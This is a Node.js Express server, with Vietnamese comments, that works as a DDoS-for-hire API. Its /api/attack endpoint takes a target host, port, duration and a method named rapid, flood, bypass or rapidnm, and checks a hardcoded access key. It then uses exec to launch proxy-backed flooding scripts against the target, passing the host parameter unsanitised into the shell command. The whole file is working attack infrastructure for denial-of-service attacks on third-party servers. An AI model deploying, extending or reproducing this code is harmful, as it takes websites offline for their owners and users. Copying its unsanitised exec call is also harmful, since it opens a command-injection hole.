const express = require("express");
const app = express();
const port = 3019;
var exec = require("child_process").exec;

let globalCooldown = true;
let cooldownEndTime = 0;

// Middleware để kiểm tra host có phải là .gov hoặc .edu không
const checkHost = (req, res, next) => {
  const { host } = req.query;
  if (host.endsWith(".gov") || host.endsWith(".edu")) {
    const err_host = {
      status: `error`,
      message: `Access denied for .gov and .edu domains`,
    };
    return res.status(403).send(err_host);
  }
  next();
};

app.use("/api/attack", checkHost); // Sử dụng middleware checkHost cho route /api/attack

app.get("/api/attack", (req, res) => {
  const startTime = process.hrtime(); // Bắt đầu ghi nhận thời gian xử lý yêu cầu

  const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP}`);
  
  if (!key || !host || !time || !method || !port) {
    const err_u = {
      status: `error`,
      message: `Server url API : /api/attack?key=[KEY]&host=[TARGET]&port=[PORT]&method=[METHODS]&time=[TIME]`,
    };
    return res.status(400).send(err_u);
  }

  if (key !== "nm0") {
    const err_key = {
      status: `error`,
      message: `Error Keys`,
    };
    return res.status(400).send(err_key);
  }

  if (time > 9999) {
    const err_time = {
      status: `error`,
      message: `Error Time < 60 Second`,
    };
    return res.status(400).send(err_time);
  }
  if (port > 65535 || port < 1) {
    const err_time = {
      status: `error`,
      message: `Error Port`,
    };
    return res.status(400).send(err_time);
  }

  if (
    !(
      method.toLowerCase() === "rapid" ||
      method.toLowerCase() === "flood" ||
      method.toLowerCase() === "bypass" ||
      method.toLowerCase() === "rapidnm"
    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      method_list: `[rapid - rapidnm - flood - bypass]`,
      detail: `only: [ rate: 32 | + thread: 7-8 | + script: each method is a different script that does not coincide with SCR but different names]`
    };
    return res.status(400).send(err_method);
  }

  const currentTime = Date.now();
  const cooldownTime = 75000;

  if (globalCooldown && currentTime < cooldownEndTime) {
    const timeLeft = ((cooldownEndTime - currentTime) / 1000).toFixed(1);
    const err_cooldown = {
      status: `error`,
      message: `Global cooldown in effect. Please wait ${timeLeft} seconds before the next attack!`,
    };
    return res.status(429).send(err_cooldown);
  }

  const jsonData = {
    status: `success/onl`,
    message: `Attack Sent`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
    conc: `1x`
  };

  const endTime = process.hrtime(startTime);
  const responseTime = (endTime[0] * 1000 + endTime[1] / 1000000).toFixed(3);
  jsonData.replyTime = `${responseTime}ms`;

  res.status(200).send(jsonData);

  globalCooldown = true;
  cooldownEndTime = currentTime + cooldownTime;

  setTimeout(() => {
    globalCooldown = false;
  }, cooldownTime);

  if (method.toLowerCase() === "rapid") {
    exec(
      `node rapid ${host} ${time} 32 8 proxy.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Lỗi: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [RAPID] executed successfully!`);
      },
    );
  }
  if (method.toLowerCase() === "flood") {
    exec(
      `node flood ${host} ${time} 32 8 proxy.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Lỗi: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [flood] executed successfully!`);
      },
    );
  }
  if (method.toLowerCase() === "bypass") {
    exec(
      `node bypass ${host} ${time} 32 7 proxy.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Lỗi: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [bypass] executed successfully!`);
      },
    );
  }
  if (method.toLowerCase() === "rapidnm") {
    exec(
      `node rapidnm ${host} ${time} 32 8 proxy.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Lỗi: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [rapidnm] executed successfully!`);
      },
    );
  }
});

app.listen(port, () => {
  console.log(`[API SERVER] đang chạy trên http://localhost:${port}`);
});
